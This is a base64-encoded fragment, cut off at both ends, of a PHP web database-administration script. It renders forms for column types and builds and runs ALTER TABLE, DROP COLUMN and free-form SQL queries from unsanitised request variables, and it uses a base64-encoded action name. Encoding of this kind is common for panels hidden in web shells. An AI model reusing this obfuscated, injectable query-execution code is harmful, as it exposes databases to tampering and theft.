H4gOTk5OS0xMi0zMSwgWVlZWS1NTS1ERCk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iREFURVRJTUUiICc7IGlmKCAkdHlwZSA9PSAiZGF0ZXRpbWUiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRBVEVUSU1FICgxMDAwLTAxLTAxIDAwOjAwOjAwIH4gOTk5OS0xMi0zMSAyMzo1OTo1OSwgWVlZWS1NTS1ERCBISDpNTTpTUyk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iVElNRVNUQU1QIiAnOyBpZiggJHR5cGUgPT0gInRpbWVzdGFtcCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElNRVNUQU1QICgxOTcwLTAxLTAxIDAwOjAwOjAwIH4gMjEwNi4uLiwgWVlZWU1NRERbSEhbTU1bU1NdXV0pPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTUUiICc7IGlmKCAkdHlwZSA9PSAidGltZSIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElNRSAoLTgzODo1OTo1OSB+IDgzODo1OTo1OSwgSEg6TU06U1MpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IllFQVIiICc7IGlmKCAkdHlwZSA9PSAieWVhciIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+WUVBUiAoMTkwMSB+IDIxNTUsIDAwMDAsIFlZWVkpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkNIQVIiICc7IGlmKCAkdHlwZSA9PSAiY2hhciIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+Q0hBUjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJWQVJDSEFSIiAnOyBpZiggJHR5cGUgPT0gInZhcmNoYXIiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlZBUkNIQVI8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iVElOWVRFWFQiICc7IGlmKCAkdHlwZSA9PSAidGlueXRleHQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlRJTllURVhUICgwIH4gMjU1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJURVhUIiAnOyBpZiggJHR5cGUgPT0gInRleHQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlRFWFQgKDAgfiA2NTUzNSk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iTUVESVVNVEVYVCIgJzsgaWYoICR0eXBlID09ICJtZWRpdW10ZXh0IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5NRURJVU1URVhUICgwIH4gMTY3NzcyMTUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkxPTkdURVhUIiAnOyBpZiggJHR5cGUgPT0gImxvbmd0ZXh0IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5MT05HVEVYVCAoMCB+IDQyOTQ5NjcyOTUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTllCTE9CIiAnOyBpZiggJHR5cGUgPT0gInRpbnlibG9iIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5USU5ZQkxPQiAoMCB+IDI1NSk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iQkxPQiIgJzsgaWYoICR0eXBlID09ICJibG9iIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5CTE9CICgwIH4gNjU1MzUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9Ik1FRElVTUJMT0IiICc7IGlmKCAkdHlwZSA9PSAibWVkaXVtYmxvYiIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TUVESVVNQkxPQiAoMCB+IDE2Nzc3MjE1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJMT05HQkxPQiIgJzsgaWYoICR0eXBlID09ICJsb25nYmxvYiIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TE9OR0JMT0IgKDAgfiA0Mjk0OTY3Mjk1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJFTlVNIiAnOyBpZiggJHR5cGUgPT0gImVudW0iICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkVOVU08L3RkPg0KPHRkIGNvbHNwYW49NT48Y2VudGVyPnZhbHVlIGxpc3Q8L2NlbnRlcj48L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlNFVCIgJzsgaWYoICR0eXBlID09ICJzZXQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlNFVDwvdGQ+DQo8dGQgY29sc3Bhbj01PjxjZW50ZXI+dmFsdWUgbGlzdDwvY2VudGVyPjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjx0YWJsZT4NCjx0cj48dGg+TTwvdGg+PHRoPkQ8L3RoPjx0aD51bnNpZ25lZDwvdGg+PHRoPnplcm9maWxsPC90aD48dGg+YmluYXJ5PC90aD48dGg+dmFsdWUgbGlzdCAoZXg6IFwnYXBwbGVcJywgXCdvcmFuZ2VcJywgXCdiYW5hbmFcJykgPC90aD48L3RyPg0KPHRyPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT10ZXh0IHNpemU9NCBuYW1lPU0gJzsgaWYoICRNICE9ICIiICkgZWNobyAidmFsdWU9JE0iO2VjaG8gJz48L3RkPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT10ZXh0IHNpemU9NCBuYW1lPUQgJzsgaWYoICREICE9ICIiICkgZWNobyAidmFsdWU9JEQiO2VjaG8gJz48L3RkPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPXVuc2lnbmVkIHZhbHVlPSJVTlNJR05FRCIgJzsgaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgInVuc2lnbmVkIiApICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPjxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9emVyb2ZpbGwgdmFsdWU9IlpFUk9GSUxMIiAnOyBpZiggc3RycG9zKCAkZmllbGR0eXBlLCAiemVyb2ZpbGwiICkgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1iaW5hcnkgdmFsdWU9IkJJTkFSWSIgJzsgaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgImJpbmFyeSIgKSAgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9dGV4dCBzaXplPTYwIG5hbWU9dmFsdWVsaXN0ICc7IGlmKCAkdmFsdWVsaXN0ICE9ICIiICkgZWNobyAidmFsdWU9XCIkdmFsdWVsaXN0XCIiO2VjaG8gJz48L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8aDM+RmxhZ3M8L2gzPg0KPHRhYmxlPg0KPHRyPjx0aD5ub3QgbnVsbDwvdGg+PHRoPmRlZmF1bHQgdmFsdWU8L3RoPjx0aD5hdXRvIGluY3JlbWVudDwvdGg+PHRoPnByaW1hcnkga2V5PC90aD48L3RyPg0KPHRyPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPW5vdF9udWxsIHZhbHVlPSJOT1QgTlVMTCIgJzsgaWYoICRmaWVsZG51bGwgIT0gIllFUyIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9dGV4dCBuYW1lPWRlZmF1bHRfdmFsdWUgJzsgaWYoICRmaWVsZGRlZmF1bHQgIT0gIiIgKSBlY2hvICJ2YWx1ZT0kZmllbGRkZWZhdWx0IjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1hdXRvX2luY3JlbWVudCB2YWx1ZT0iQVVUT19JTkNSRU1FTlQiICc7IGlmKCAkZmllbGRleHRyYSA9PSAiYXV0b19pbmNyZW1lbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPjxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9cHJpbWFyeV9rZXkgdmFsdWU9IlBSSU1BUlkgS0VZIiAnOyBpZiggJGZpZWxka2V5ID09ICJQUkkiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjxwPic7DQoJaWYoICRjbWQgPT0gImFkZCIgKQ0KCQllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0FkZCBGaWVsZCc+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdFZGl0IEZpZWxkJz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9YnV0dG9uIHZhbHVlPUNhbmNlbCBvbkNsaWNrPSdoaXN0b3J5LmJhY2soKSc+XG4iOw0KCWVjaG8gIjwvZm9ybT5cbiI7DQp9DQoNCmZ1bmN0aW9uIG1hbmFnZUZpZWxkX3N1Ym1pdCggJGNtZCApIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkb2xkX25hbWUsICRuYW1lLCAkdHlwZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2csDQoJCSRNLCAkRCwgJHVuc2lnbmVkLCAkemVyb2ZpbGwsICRiaW5hcnksICRub3RfbnVsbCwgJGRlZmF1bHRfdmFsdWUsICRhdXRvX2luY3JlbWVudCwgJHByaW1hcnlfa2V5LCAkdmFsdWVsaXN0Ow0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJJHF1ZXJ5U3RyID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgQUREICRuYW1lICI7DQoJZWxzZSBpZiggJGNtZCA9PSAiZWRpdCIgKQ0KCQkkcXVlcnlTdHIgPSAiQUxURVIgVEFCTEUgJHRhYmxlbmFtZSBDSEFOR0UgJG9sZF9uYW1lICRuYW1lICI7DQoJaWYoICRNICE9ICIiICkNCgkJaWYoICREICE9ICIiICkNCgkJCSRxdWVyeVN0ciAuPSAiJHR5cGUoJE0sJEQpICI7DQoJCWVsc2UNCgkJCSRxdWVyeVN0ciAuPSAiJHR5cGUoJE0pICI7DQoJZWxzZSBpZiggJHZhbHVlbGlzdCAhPSAiIiApIHsNCgkJJHZhbHVlbGlzdCA9IHN0cmlwc2xhc2hlcyggJHZhbHVlbGlzdCApOw0KCQkkcXVlcnlTdHIgLj0gIiR0eXBlKCR2YWx1ZWxpc3QpICI7DQoJfSBlbHNlDQoJCSRxdWVyeVN0ciAuPSAiJHR5cGUgIjsNCgkkcXVlcnlTdHIgLj0gIiR1bnNpZ25lZCAkemVyb2ZpbGwgJGJpbmFyeSAiOw0KCWlmKCAkZGVmYXVsdF92YWx1ZSAhPSAiIiApDQoJCSRxdWVyeVN0ciAuPSAiREVGQVVMVCAnJGRlZmF1bHRfdmFsdWUnICI7DQoJJHF1ZXJ5U3RyIC49ICIkbm90X251bGwgJGF1dG9faW5jcmVtZW50IjsNCglteXNxbF9zZWxlY3RfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIsICRteXNxbEhhbmRsZSApOw0KCSRlcnJNc2cgPSBteXNxbF9lcnJvcigpOw0KCS8vIGtleSBjaGFuZ2UNCgkka2V5Q2hhbmdlID0gZmFsc2U7DQoJJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCAiU0hPVyBLRVlTIEZST00gJHRhYmxlbmFtZSIgKTsNCgkkcHJpbWFyeSA9ICIiOw0KCXdoaWxlKCAkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCkgKQ0KCQlpZiggJHJvd1siS2V5X25hbWUiXSA9PSAiUFJJTUFSWSIgKSB7DQoJCQlpZiggJHJvd1tDb2x1bW5fbmFtZV0gPT0gJG5hbWUgKQ0KCQkJCSRrZXlDaGFuZ2UgPSB0cnVlOw0KCQkJZWxzZQ0KCQkJCSRwcmltYXJ5IC49ICIsICRyb3dbQ29sdW1uX25hbWVdIjsNCgkJfQ0KCWlmKCAkcHJpbWFyeV9rZXkgPT0gIlBSSU1BUlkgS0VZIiApIHsNCgkJJHByaW1hcnkgLj0gIiwgJG5hbWUiOw0KCQkka2V5Q2hhbmdlID0gISRrZXlDaGFuZ2U7DQoJfQ0KCSRwcmltYXJ5ID0gc3Vic3RyKCAkcHJpbWFyeSwgMiApOw0KCWlmKCAka2V5Q2hhbmdlID09IHRydWUgKSB7DQoJCSRxID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgRFJPUCBQUklNQVJZIEtFWSI7DQoJCW15c3FsX3F1ZXJ5KCAkcSApOw0KCQkkcXVlcnlTdHIgLj0gIjxicj5cbiIgLiAkcTsNCgkJJGVyck1zZyAuPSAiPGJyPlxuIiAuIG15c3FsX2Vycm9yKCk7DQoJCSRxID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgQUREIFBSSU1BUlkgS0VZKCAkcHJpbWFyeSApIjsNCgkJbXlzcWxfcXVlcnkoICRxICk7DQoJCSRxdWVyeVN0ciAuPSAiPGJyPlxuIiAuICRxOw0KCQkkZXJyTXNnIC49ICI8YnI+XG4iIC4gbXlzcWxfZXJyb3IoKTsNCgl9DQoJdmlld1NjaGVtYSgpOw0KfQ0KDQpmdW5jdGlvbiBkcm9wRmllbGQoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJGZpZWxkbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgRFJPUCBDT0xVTU4gJGZpZWxkbmFtZSI7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglteXNxbF9xdWVyeSggJHF1ZXJ5U3RyICwgJG15c3FsSGFuZGxlICk7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJdmlld1NjaGVtYSgpOw0KfQ0KDQpmdW5jdGlvbiB2aWV3RGF0YSggJHF1ZXJ5U3RyICkgew0KCWdsb2JhbCAkYWN0aW9uLCAkbXlzcWxIYW5kbGUsICRkYm5hbWUsICR0YWJsZW5hbWUsICRQSFBfU0VMRiwgJGVyck1zZywgJHBhZ2UsICRyb3dwZXJwYWdlLCAkb3JkZXJieTsNCgllY2hvICI8aDE+RGF0YSBpbiBUYWJsZTwvaDE+XG4iOw0KCWlmKCAkdGFibGVuYW1lICE9ICIiICkNCgkJZWNobyAiPHAgY2xhc3M9bG9jYXRpb24+JGRibmFtZSAmZ3Q7ICR0YWJsZW5hbWU8L3A+XG4iOw0KCWVsc2UNCgkJZWNobyAiPHAgY2xhc3M9bG9jYXRpb24+JGRibmFtZTwvcD5cbiI7DQoJJHF1ZXJ5U3RyID0gc3RyaXBzbGFzaGVzKCAkcXVlcnlTdHIgKTsNCglpZiggJHF1ZXJ5U3RyID09ICIiICkgew0KCQkkcXVlcnlTdHIgPSAiU0VMRUNUICogRlJPTSAkdGFibGVuYW1lIjsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICkNCgkJCSRxdWVyeVN0ciAuPSAiIE9SREVSIEJZICRvcmRlcmJ5IjsNCgkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1hZGREYXRhJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5BZGQgRGF0YTwvYT4gfCBcbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dmlld1NjaGVtYSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+U2NoZW1hPC9hPlxuIjsNCgl9DQoJJHBSZXN1bHQgPSBteXNxbF9kYl9xdWVyeSggJGRibmFtZSwgJHF1ZXJ5U3RyICk7DQoJJGZpZWxkdCA9IG15c3FsX2ZldGNoX2ZpZWxkKCRwUmVzdWx0KTsNCgkkdGFibGVuYW1lID0gJGZpZWxkdC0+dGFibGU7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJJEdMT0JBTFNbcXVlcnlTdHJdID0gJHF1ZXJ5U3RyOw0KCWlmKCAkcFJlc3VsdCA9PSBmYWxzZSApIHsNCgkJZWNob1F1ZXJ5UmVzdWx0KCk7DQoJCXJldHVybjsNCgl9DQoJaWYoICRwUmVzdWx0ID09IDEgKSB7DQoJCSRlcnJNc2cgPSAiU3VjY2VzcyI7DQoJCWVjaG9RdWVyeVJlc3VsdCgpOw0KCQlyZXR1cm47DQoJfQ0KCWVjaG8gIjxocj5cbiI7DQoJJHJvdyA9IG15c3FsX251bV9yb3dzKCAkcFJlc3VsdCApOw0KCSRjb2wgPSBteXNxbF9udW1fZmllbGRzKCAkcFJlc3VsdCApOw0KCWlmKCAkcm93ID09IDAgKSB7DQoJCWVjaG8gIk5vIERhdGEgRXhpc3QhIjsNCgkJcmV0dXJuOw0KCX0NCglpZiggJHJvd3BlcnBhZ2UgPT0gIiIgKSAkcm93cGVycGFnZSA9IDMwOw0KCWlmKCAkcGFnZSA9PSAiIiApICRwYWdlID0gMDsNCgllbHNlICRwYWdlLS07DQoJbXlzcWxfZGF0YV9zZWVrKCAkcFJlc3VsdCwgJHBhZ2UgKiAkcm93cGVycGFnZSApOw0KCWVjaG8gIjx0YWJsZSBjZWxsc3BhY2luZz0xIGNlbGxwYWRkaW5nPTI+XG4iOw0KCWVjaG8gIjx0cj5cbiI7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJGNvbDsgJGkrKyApIHsNCgkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaSApOw0KCQllY2hvICI8dGg+IjsNCgkJaWYoJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IikNCgkJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJm9yZGVyYnk9Ii4kZmllbGQtPm5hbWUuIic+Ii4kZmllbGQtPm5hbWUuIjwvYT5cbiI7DQoJCWVsc2UNCgkJCWVjaG8gJGZpZWxkLT5uYW1lLiJcbiI7DQoJCWVjaG8gIjwvdGg+XG4iOw0KCX0NCgllY2hvICI8dGggY29sc3Bhbj0yPkFjdGlvbjwvdGg+XG4iOw0KCWVjaG8gIjwvdHI+XG4iOw0KCWZvciggJGkgPSAwOyAkaSA8ICRyb3dwZXJwYWdlOyAkaSsrICkgew0KCQkkcm93QXJyYXkgPSBteXNxbF9mZXRjaF9yb3coICRwUmVzdWx0ICk7DQoJCWlmKCAkcm93QXJyYXkgPT0gZmFsc2UgKSBicmVhazsNCgkJZWNobyAiPHRyPlxuIjsNCgkJJGtleSA9ICIiOw0KCQlmb3IoICRqID0gMDsgJGogPCAkY29sOyAkaisrICkgew0KCQkJJGRhdGEgPSAkcm93QXJyYXlbJGpdOw0KCQkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaiApOw0KCQkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQkJJGtleSAuPSAiJiIgLiAkZmllbGQtPm5hbWUgLiAiPSIgLiAkZGF0YTsNCgkJCWlmKCBzdHJsZW4oICRkYXRhICkgPiAzMCApDQoJCQkJJGRhdGEgPSBzdWJzdHIoICRkYXRhLCAwLCAzMCApIC4gIi4uLiI7DQoJCQkkZGF0YSA9IGh0bWxzcGVjaWFsY2hhcnMoICRkYXRhICk7DQoJCQllY2hvICI8dGQ+XG4iOw0KCQkJZWNobyAiJGRhdGFcbiI7DQoJCQllY2hvICI8L3RkPlxuIjsNCgkJfQ0KCQlpZiggJGtleSA9PSAiIiApDQoJCQllY2hvICI8dGQgY29sc3Bhbj0yPm5vIEtleTwvdGQ+XG4iOw0KCQllbHNlIHsNCgkJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWVkaXREYXRhJGtleSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+RWRpdDwvYT48L3RkPlxuIjsNCgkJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWRlbGV0ZURhdGEka2V5JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0RlbGV0ZSBSb3c/JylcIj5EZWxldGU8L2E+PC90ZD5cbiI7DQoJCX0NCgkJZWNobyAiPC90cj5cbiI7DQoJfQ0KCWVjaG8gIjwvdGFibGU+XG4iOw0KCWVjaG8gIjxmb250IHNpemU9MiBjbGFzcz1cIm5ld1wiPlxuIjsNCglpZigkYWN0aW9uID09ICJkbWxsZDBSaGRHRT0iKQ0KCQllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBtZXRob2Q9cG9zdD5cbiI7DQoJZWxzZQ0KCQllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRj9hY3Rpb249cXVlcnkmZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmcXVlcnlTdHI9JHF1ZXJ5U3RyJyBtZXRob2Q9cG9zdD5cbiI7DQoJZWNobyAoJHBhZ2UrMSkuIi8iLihpbnQpKCRyb3cvJHJvd3BlcnBhZ2UrMSkuIiBwYWdlIjsNCgllY2hvICI8L2ZvbnQ+XG4iOw0KCWVjaG8gIiB8ICI7DQoJaWYoICRwYWdlID4gMCApIHsNCgkJaWYoJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IikNCgkJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJnBhZ2U9Ii4oJHBhZ2UpOw0KCQllbHNlDQoJCQllY2hvICI8YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPXF1ZXJ5JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJnF1ZXJ5U3RyPSRxdWVyeVN0ciZwYWdlPSIuKCRwYWdlKTsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICYmICRhY3Rpb24gPT0gImRtbGxkMFJoZEdFPSIpDQoJCQllY2hvICImb3JkZXJieT0kb3JkZXJieSI7DQoJCWVjaG8gIic+UHJldjwvYT5cbiI7DQoJfSBlbHNlDQoJCWVjaG8gIjxmb250IHNpemU9MiBjbGFzcz1cIm5ld1wiPlByZXY8L2ZvbnQ+IjsNCgllY2hvICIgfCAiOw0KCWlmKCAkcGFnZSA8ICgkcm93LyRyb3dwZXJwYWdlKS0xICkgew0KCQlpZigkYWN0aW9uID09ICJkbWxsZDBSaGRHRT0iKQ0KCQkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1kbWxsZDBSaGRHRT0mZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmcGFnZT0iLigkcGFnZSsyKTsNCgkJZWxzZQ0KCQkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1xdWVyeSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSZxdWVyeVN0cj0kcXVlcnlTdHImcGFnZT0iLigkcGFnZSsyKTsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICYmICRhY3Rpb24gPT0gImRtbGxkMFJoZEdFPSIpDQoJCQllY2hvICImb3JkZXJieT0kb3JkZXJieSI7DQoJCWVjaG8gIic+TmV4dDwvYT5cbiI7DQoJfSBlbHNlDQoJCWVjaG8gIk5leHQiOw0KCWVjaG8gIiB8ICI7DQoJaWYoICRyb3cgPiAkcm93cGVycGFnZSApIHsNCgkJZWNobyAiPGlucHV0IH